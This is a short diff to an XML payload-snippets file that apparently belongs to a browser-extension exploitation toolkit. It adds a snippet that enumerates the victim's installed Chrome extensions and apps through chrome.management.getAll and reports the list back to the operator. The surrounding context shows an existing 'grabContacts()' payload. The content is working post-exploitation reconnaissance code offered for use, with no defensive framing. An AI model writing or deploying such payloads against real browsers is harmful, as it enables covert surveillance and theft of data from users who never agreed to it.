@@ -148,4 +148,12 @@ x.send(null);
         grabContacts();
 })();
 </snippet>
+<snippet type="eval-ext-snippets" name="get installed apps">
+// requires management permission
+try {
+  chrome.management.getAll(function(list){log({type:'recveval',result: list})})
+} catch (e){
+  log({type:'recveval', result:false});
+}
+</snippet>
 </snippets>
